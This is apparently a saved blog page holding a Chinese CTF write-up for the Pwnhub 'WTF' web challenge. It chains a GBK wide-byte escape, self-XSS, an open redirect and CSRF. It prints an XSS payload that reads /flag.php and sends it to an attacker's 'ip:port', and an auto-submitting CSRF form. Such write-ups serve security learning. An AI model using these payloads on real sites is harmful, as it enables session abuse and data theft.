@@ -1,0 +1,395 @@
+<!DOCTYPE HTML>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
+<meta content="yes" name="apple-mobile-web-app-capable">
+<title>Pwnhub第三期题目－WTF wp - Veneno's Blog</title>
+<link href="./Pwnhub第三期题目－WTF wp - Veneno's Blog/highslide.css" rel="stylesheet" type="text/css"/>
+<!--[if lt IE 7]>
+<link rel="stylesheet" type="text/css" href="http://www.venenof.com/usr/plugins/HighSlide/css/highslide-ie6.css" />
+<![endif]-->
+<meta content="好吧...不得不承认自己菜...研究了一下。首先我们发现有以下点：login.php处有跳转参数report bug的url必须是题目url开头写文章会过滤' &amp;quot; &amp;lt; &amp;gt;写..." name="description">
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-187'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-187'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        focus: 'focus',
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        focus: 'onfocus',
+        load: 'onload'
+    };
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-187');
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                var f = forms[0], textarea = f.getElementsByTagName('textarea')[0], added = false;
+
+                if (null != textarea && 'text' == textarea.name) {
+                    textarea[event.add](event.focus, function () {
+                        if (!added) {
+                            var input = document.createElement('input');
+                            input.type = 'hidden';
+                            input.name = '_';
+                            input.value = (function () {
+    var _NWQ = //'R'
+'0c7'+//'Y'
+'Y'+//'kcE'
+'1d'+/* 'fp'//'fp' */''+//'I'
+'7'+'806'//'jB7'
++'1'//'S'
++//'gS2'
+'3'+//'R'
+'8'+'70c'//'D6l'
++'BX'//'BX'
++//'ZB'
+'1'+//'sCg'
+'sCg'+'890'//'n'
++''///*'na1'*/'na1'
++''///*'lFp'*/'lFp'
++//'ED'
+'bc'+//'Nx'
+'Nx'+//'IS'
+'6a'+//'Wb2'
+'b08'+'0e'//'QGa'
++//'gAD'
+'ee7'+'1'//'QH'
+, _uyjj = [[3,4],[15,17],[16,19],[21,23]];
+    
+    for (var i = 0; i < _uyjj.length; i ++) {
+        _NWQ = _NWQ.substring(0, _uyjj[i][0]) + _NWQ.substring(_uyjj[i][1]);
+    }
+
+    return _NWQ;
+})();
+
+                            f.appendChild(input);
+                            added = true;
+                        }
+                    });
+                }
+            }
+        }
+    });
+})();
+</script><link href="./Pwnhub第三期题目－WTF wp - Veneno's Blog/style.css" rel="stylesheet"/>
+<link href="./Pwnhub第三期题目－WTF wp - Veneno's Blog/prism.css" rel="stylesheet"/>
+<link href="./Pwnhub第三期题目－WTF wp - Veneno's Blog/iconfont.css" rel="stylesheet"/>
+<link href="./Pwnhub第三期题目－WTF wp - Veneno's Blog/player.css" rel="stylesheet"/>
+<link href="" rel="shortcut icon"/>
+</meta></meta></head>
+<body>
+<header>
+<div class="main">
+<div class="intro"> <img class="intro-logo" src="./Pwnhub第三期题目－WTF wp - Veneno's Blog/veneno.jpeg"/> <span class="intro-sitename"><a href="http://www.venenof.com/">
+      Veneno's Blog      </a></span> <span class="intro-siteinfo">
+      The harder you struggle today,the more glorious you will be tomorrow.      </span> <span class="social"> <a href="" target="_blank"><i class="iconfont icon-qq"></i></a> <a href="" target="_blank"><i class="iconfont icon-mail"></i></a> <a href="" target="_blank"><i class="iconfont icon-weibo"></i></a> <a href="" target="_blank"><i class="iconfont icon-github"></i></a> </span> </div>
+<nav>
+<div class="collapse">
+<i class="iconfont icon-menu"></i></div>
+<ul class="bar">
+<li><a href="http://www.venenof.com/">首页</a></li>
+<li><a href="http://www.venenof.com/index.php/archive.html">
+          时间          </a></li>
+<li><a href="http://www.venenof.com/index.php/link.html">
+          友链          </a></li>
+<li><a href="http://www.venenof.com/index.php/Veneno.html">
+          About Me          </a></li>
+</ul>
+</nav>
+<a class="icon-search" id="btnChange" onclick="searchbox();"></a>
+<div id="search" style="display:none">
+<div class="icon-close" onclick="searchbox();"></div>
+<form action="/index.php" class="search" id="searchform" method="get" name="form">
+<input autofocus="autofocus" id="searchText" name="s" placeholder="输入关键字查找" style="margin-top:25%" type="search"/>
+</form>
+</div>
+</div></header><content>
+<div class="main">
+<div class="article">
+<div class="article-title">Pwnhub第三期题目－WTF wp</div>
+<small class="article-time">发表于： <time datetime="2016-12-13T17:51:00+00:00" itemprop="datePublished">2016-12-13</time> | 分类： <a href="http://www.venenof.com/index.php/category/PHP/">PHP</a>,<a href="http://www.venenof.com/index.php/category/CTF/">CTF</a>,<a href="http://www.venenof.com/index.php/category/Web/">Web</a> | <a href="http://www.venenof.com/index.php/archives/187/#comments" itemprop="discussionUrl">评论：0 </a> | 阅读：223</small>
+<div class="article-content">
+<p>好吧...不得不承认自己菜...<br/>
+研究了一下。<br/>
+首先我们发现有以下点：</p>
+<ul>
+<li>login.php处有跳转参数</li>
+<li>report bug的url必须是题目url开头</li>
+<li>写文章会过滤' " &lt; &gt;</li>
+<li>写文章时GBK</li>
+<li>只能看自己的文章</li>
+</ul>
+<!--more-->
+<p>一开始以为是bypass csp...然后csp规则那么严，pass你妹...<br/>
+因为写文章时是GBK，那么可以利用宽字节绕过，去逃逸\：<br/>
+尝试弹窗：<br/>
+<img alt="1.png" src="./Pwnhub第三期题目－WTF wp - Veneno's Blog/3228492074.png"/><br/>
+那么看下new.php：<br/>
+<img alt="2.png" src="./Pwnhub第三期题目－WTF wp - Veneno's Blog/2317692916.png"/><br/>
+调用了jquery，并不是很懂js，赛后看了猫哥以及小m的writeup，查了查总算懂了。<br/>
+首先在先前的准备中我们已经得知这是一个self－xss，而bug存在跳转，那么理所当然就是一个csrf<br/>
+那么我们的思路就是这样：</p>
+<ul>
+<li>csrf—&gt;添加文章-&gt;内容是访问flag.php-&gt;vps监听端口，看返回包</li>
+</ul>
+<p>OK，那么我们添加的内容是什么：<br/>
+首先这个题的flag是中文，也就是我们需要escape编码下：<br/>
+而后根据ajax的用法：<a href="http://www.runoob.com/jquery/ajax-ajax.html">文档</a>构造payload：</p>
+<blockquote>
+<p>escape($.ajax({url: '/flag.php', async: 0}).responseText)</p>
+</blockquote>
+<p>那么下面就是把response给转发到你的vps上，于是最后的payload就是：</p>
+<pre><code>&lt;img src=1 onerror=document.location=//ip:port+escape($.ajax({url: '/flag.php', async: 0}).responseText) &gt;
+</code></pre>
+<p>所以接下来就是构造一个html，模拟上传就OK了：</p>
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset="ISO-8859-15"&gt;
+&lt;script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"&gt;&lt;/script&gt;
+&lt;/head&gt;
+  &lt;body&gt;
+    &lt;form id="forms" action="http://54.223.108.205:23333/new.php" method="POST" charset="ISO-8859-15"&gt;
+      &lt;input type="text" name="title" value="1venenohh" /&gt;
+      &lt;input type="text" name="content" value="&amp;#xdb;&amp;#x5c;x3cimg src=1 onerror=doc
+ument.location=String.fromCharCode(xxxxx)&amp;#x2b;escape($.ajax({url:String.fromCharCode(47,102,108,97,103,46,112,104,112),async:0}).responseText)&amp;#x20;&amp;#xdb;&amp;#x5c;x3e"&gt;&lt;/input&gt;
+      &lt;input type="submit" value="Submit" /&gt;
+    &lt;/form&gt;
+&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>然后就是猜下id，再构造一个js去访问id即可：</p>
+<pre><code>&lt;script&gt;
+location="http://54.223.108.205:23333/view.php?id=xxxxxx";
+&lt;/script&gt;
+</code></pre>
+<p>vps收到flag：<br/>
+<img alt="3.png" src="./Pwnhub第三期题目－WTF wp - Veneno's Blog/2022036501.png"/></p>
+</div>
+<div class="post-footer">
+<div class=" post-tags">
+<div class="tag"> 标签: none</div>
+<div class="post-nav">
+<li class="prev"><a href="http://www.venenof.com/index.php/archives/183/" title="Pwnhub第二期题目－另一份文件wp">Pwnhub第二期题目－另一份文件wp</a></li>
+<li class="next">
+<a href="http://www.venenof.com/index.php/archives/194/" title="SECCON Quals 2016 – biscuiti-writeup">SECCON Quals 2016 – biscuiti-writeup</a></li>
+</div>
+</div>
+</div>
+</div></div></content>
+<div id="comments">
+<!-- Duoshuo Comment BEGIN -->
+<div class="ds-thread" data-author-key="1" data-thread-key="187" data-title="Pwnhub第三期题目－WTF wp" data-url=""></div>
+<script type="text/javascript">
+	var duoshuoQuery = {short_name:"veneno1",theme:"dark"};
+	(function() {
+		var ds = document.createElement("script");
+		ds.type = "text/javascript";ds.async = true;
+		ds.src = "http://static.duoshuo.com/embed.js";
+		ds.charset = "UTF-8";
+		(document.getElementsByTagName("head")[0] 
+		|| document.getElementsByTagName("body")[0]).appendChild(ds);
+	})();
+	</script>
+<!-- Duoshuo Comment END -->
+</div>
+</body></html>
+﻿<div class="willerce">
+<div> </div>
+<!--播放器 -->
+<div id="QPlayer">
+<div id="pContent">
+<div id="player"> <span class="cover"></span>
+<div class="ctrl">
+<div class="musicTag marquee"> <strong>Title</strong> <span> - </span> <span class="artist">Artist</span> </div>
+<div class="progress">
+<div class="timer left">0:00</div>
+<div class="contr">
+<div class="rewind icon"></div>
+<div class="playback icon"></div>
+<div class="fastforward icon"></div>
+</div>
+<div class="right">
+<div class="liebiao icon"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="ssBtn">
+<div class="adf"></div>
+</div>
+</div>
+<ol id="playlist">
+</ol>
+</div>
+<script src="./Pwnhub第三期题目－WTF wp - Veneno's Blog/jquery.min.js"></script>
+<script src="./Pwnhub第三期题目－WTF wp - Veneno's Blog/jquery.marquee.min.js"></script>
+<script>
+	var	playlist = [	
+];
+  var isRotate = 1;
+  var autoplay = ;  
+</script>
+<script src="./Pwnhub第三期题目－WTF wp - Veneno's Blog/player.js"></script>
+<script>
+function bgChange(){
+	var lis= $('.lib');
+	for(var i=0; i<lis.length; i+=2)
+	lis[i].style.background = 'rgba(246, 246, 246, 0.5)';
+}
+window.onload = bgChange;
+</script>
+<!--<div class="qrcode">
+  <img src="" width="126" height="136" alt=""> </div>-->
+<footer>
+<p> <a href="" target="_blank">网站地图</a><br/>
+Copyright © 2015-2017 <a href="http://www.venenof.com/">
+    Veneno's Blog    
+<script src="./Pwnhub第三期题目－WTF wp - Veneno's Blog/highslide.packed.js" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+hs.graphicsDir = "http://www.venenof.com/usr/plugins/HighSlide/css/graphics/";
+hs.fadeInOut = true;
+hs.transitions = ["expand","crossfade"];
+hs.lang.creditsText = "&copy; www.venenof.com";
+hs.lang.creditsTitle = "&copy; www.venenof.com";
+hs.creditsHref = "http://www.venenof.com/index.php";
+hs.creditsPosition = "top left";
+hs.lang={
+loadingText : "载入中...",
+loadingTitle : "取消",
+closeText : "关闭",
+closeTitle : "关闭 (Esc)",
+previousText : "上一张",
+previousTitle : "上一张 (←键)",
+nextText : "下一张",
+nextTitle : "下一张 (→键)",
+moveTitle : "移动",
+moveText : "移动",
+playText : "播放",
+playTitle : "幻灯播放 (空格键)",
+pauseText : "暂停",
+pauseTitle : "幻灯暂停 (空格键)",
+number : "第%1张 共%2张",
+restoreTitle :	"点击关闭或拖动. 左右方向键切换图片. ",
+fullExpandTitle : "完整尺寸",
+fullExpandText :  "原大"
+};
+//]]>
+</script>
+<script>
+document.body.addEventListener('copy', function (e) {
+    if (window.getSelection().toString() && window.getSelection().toString().length > 10) {
+        setClipboardText(e);
+    }
+}); 
+function setClipboardText(event) {
+    var clipboardData = event.clipboardData || window.clipboardData;
+    if (clipboardData) {
+        event.preventDefault();
+        var htmlData = ''
+            + '著作权归作者所有。<br>'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。<br>'
+            + '作者：Veneno<br>'
+            + '链接：' + window.location.href + '<br>'
+            + '来源：http://www.venenof.com/<br><br>'
+            + window.getSelection().toString();
+        var textData = ''
+            + '著作权归作者所有。\n'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。\n'
+            + '作者：Veneno\n'
+            + '链接：' + window.location.href + '\n'
+            + '来源：http://www.venenof.com/\n\n'
+            + window.getSelection().toString();
+        clipboardData.setData('text/html', htmlData);
+        clipboardData.setData('text/plain',textData);
+    }
+}
+</script>
+</a></p></footer>
+<div class="toTop">TOP</div>
+<script src="./Pwnhub第三期题目－WTF wp - Veneno's Blog/all.js"></script>
+<script src="./Pwnhub第三期题目－WTF wp - Veneno's Blog/jquery.js"></script>
+<script src="./Pwnhub第三期题目－WTF wp - Veneno's Blog/prism.js"></script>
+<script src="./Pwnhub第三期题目－WTF wp - Veneno's Blog/search.js"></script>
+</div>
+
